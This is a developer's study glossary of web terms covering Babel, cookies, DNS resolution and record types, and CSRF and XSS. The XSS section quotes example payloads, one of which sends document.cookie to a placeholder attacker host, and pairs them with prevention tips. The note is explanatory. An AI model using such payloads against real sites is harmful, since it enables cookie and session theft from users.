# Technical terms

<https://punits.dev/jargon-free-intros/>

## Transpile:

convert the code so that older browser can also run it.

## Babel:

enable writing codes with JS features that are not supported by most browser yet. The modern code is transpiled back to vanilla JS so that every environment can understand it.
`babel-loader`: the loader used with Webpack to transpile JS

## render tree:

is the combination of The CSSOM and DOM tree created in the parsing HTML step. Render tree is then used to compute the layout of every single element, which is then painted to the screen. <https://web.dev/howbrowserswork/>

`layout or reflow`: When the render tree is created, it does not have a position and size. Calculating these values is called layout or reflow

## race condition:

two different requests 'raced' against each other and the result might come in a different order than you expected. <https://beta.reactjs.org/learn/you-might-not-need-an-effect>

## RESTful API:

is the api that help client interact with server to exchange information via HTTP methods (GET, POST, PUT, DELETE)

## deploying:

the act of taking a website live on a server

## Cookie:

<https://prateeksurana.me/blog/javascript-developer-guide-to-browser-cookies/>

- `httpOnly`: prevent browser to read any cookies with the cookie API
- `SameSite`: `SameSite=Strict`: Domain in URL bar equals the cookie's domain (first-party) AND the link to the request is on the same domain as well. `SameSite=Lax`: Domain in URL bar equals the cookie's domain (first-party), the link to the request can be from the other site that point to domain, like you click on the domain on google search result.
- `domain`: tell browser which host are allowed to access a cookie, default to the same host that set the cookie. This attribute is used only when the current domain is a subdomain like abc.xyz.com. So the default domain is abc.xyz.com and if your client is hosted on another domain, not abc.xyz.com, the cookies are set in response header but they aren't existed on client site
- `path`: tell browser which path are allowed to access a cookie. A cookie with the path attribute as Path=/store would only be accessible on the path /store and its subpaths /store/cart, /store/gadgets
- `secure`: A cookie with the Secure attribute is only sent to the server over the secure HTTPS protocol, so the domain of client must be HTTPS

## tree-shaking:

remove unused code before bundling. This can be an issue when using barrel files: <https://github.com/vercel/next.js/issues/12557> <https://renatopozzi.me/articles/your-nextjs-bundle-will-thank-you>

## postCSS:

it's like webpack for CSS. There are variaty of postCSS plugins like minify, compile sass to css... <https://www.youtube.com/watch?v=Kn2SKUOaoT4>

## hydration:

is the process of getting your static HTML from server and turning it into dynamic DOM that React can modify

## encode and encrypt

- Encoding transforms data into another format using a scheme that is publicly available so that it can easily be reversed.
- Encryption transforms data into another format in such a way that only specific individual(s) can reverse the transformation

## Nameservers and DNS:

<https://www.bluehost.com/blog/the-low-down-what-is-a-nameserver-why-it-matters-for-your-website>
<https://kinsta.com/knowledgebase/what-is-a-nameserver/>
<https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>

### Concept

`DNS` (Domain Name System) is the system that is used to translate domain names into IP address.

`DNS` is composed of multiple `nameservers`, which can be known as [`DNS server`](https://www.namecheap.com/support/knowledgebase/article.aspx/766/10/what-is-dns-server-name-server/). Nameservers or DNS servers function is to store, organize DNS records and returns IP addresses for a domain to browser. `DNS records` are what contains actual information that browsers need to interact with, like the IP addresses. 

### What happens when you visit a website:

<https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>
<https://www.cloudflare.com/learning/dns/dns-server-types/#recursive-resolver>

- You type URL like example.com into the address bar and hit enter
- Your browser uses DNS to retrieve the domain's nameservers: <https://www.youtube.com/watch?v=72snZctFFtA>
  + DNS resolver (also known as a DNS recursor) receives the query first. The recursive resolver acts as a middleman between a client and a DNS nameserver
  + The URL gets broken up into sections. 
  + DNS resolver queries a top-level domain (TLD) nameserver, which then points the query to the nameserver that contains 'example.', which is domain registrar's nameserver
  + That information is brought back to your browser.
- Your browser asks for the A record that contains the IP address of the web server (a specific DNS record)
- The nameservers provide the IP address from the A record
- Your browser requests the website content from that IP address
- Your browser retrieves the content and renders it in your browser

After retrieving the correct IP address for a given website, the resolver will then store that information in its cache for a limited amount of time. During this time period, if any other clients send requests for that domain name, the resolver can skip the typical DNS lookup process and simply respond to the client with the IP address saved in the cache.

Once the caching time limit expires, the resolver must retrieve the IP address again, creating a new entry in its cache. This time limit, referred to as the time-to-live (TTL) is set explicitly in the DNS records for each site. Typically the TTL is in the 24-48 hour range. A TTL is necessary because web servers occasionally change their IP addresses, so resolvers cannot serve the same IP from the cache indefinitely.

### Where are your Domain's Nameservers located:

By default, when you register a domain, you will use your domain registra's nameservers, such as Namecheap's nameservers:

`
dns1.registrar-servers.com
dns2.registrar-servers.com
`

However, the best recomandation is to use web hosting's nameserver or third-party nameservers like Cloudflare

The important thing to remember is this:

If you change your domain's nameservers away from the default nameservers at your domain registrar, you'll control your domain's DNS records at **your nameserver provider**, **not** your domain registrar

### DNS record types

- A Record: point a domain (or subdomain) to an IP address
- CNAME Record (Canonical name record): points a domain to another domain. This is used when a site has subdomains, such as shop.myblog.com or donations.myblog.com. These are subdomains of myblog.com. Let’s say that each of these subdomains has a CNAME record containing the value “myblog.com.” Since the DNS is looking for an IP address, when the CNAME record is accessed, a further lookup is carried out at myblog.com (as this is the value contained in the CNAME file). It will then return the IP address stored in myblog.com’s A record. This means that these subdomains are aliases of the main domain, and the canonical name (or true name) of these subdomains is actually 'myblog.com'
- MX Record: point email to a particular mail server. Like a CNAME, MX Entries must point to a domain and never point directly to an IP address.

## CSRF and XSS

<https://www.hacksplaining.com/>
<https://jerrynsh.com/all-to-know-about-auth-and-cookies/>

### XSS attack

XSS is a type of attack where an attacker injects his JavaScript that will run on your page and take control like retrieve, update the database or change the DOM. 

There are two types of XSS attack:

- Stored XSS

Attacker attempts to inject JavaScript through form inputs, where the attacker puts an `alert(localStorage.getItem('your-secret-token'))` into a form then submit. The JS code is saved to DB and will be executed when other users visit the website, including attacker.

- Reflected XSS

Attackers inject JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed and user will be redirect to attacker site which implement a log system that can extract the cookie data

As you can see XSS exploit storage (session or local) and cookie that `httpOnly` set to `false`

How to prevent:

- Using cookie with `httpOnly` flag set to true
- Escape dynamic content from database so the malicious script will be escape when rendered on page.

### CSRF attack

<https://zellwk.com/blog/understanding-csrf-attacks/>

Attacker tricks user into submitting a malicious request, execute unwanted actions to a website where they are authenticated

The request must originate from another website, which gives it the name "Cross-Site". This request also impersonates an authenticated user, which gives it the name "Request Forgery".

For example: Attacker send a picture with malicious website URL to user email. This website includes an unwanted request to user bank website, like send attacker money and it is run automatically when the user visit website. Luckily, the user has just logged into bank account which means the cookie is stored in browser. Then he is tricked to visit the malicious website and the unwanted request is made because the cookie is still available.

How to prevent

- Using cookie with `SameSite` flag set to `Lax` or `Strict`

## Artifacts in devops

Pipeline artifact: files that are produced by a step in the pipeline, which can be used as the input for next step)
Build artifact: files that created by build process.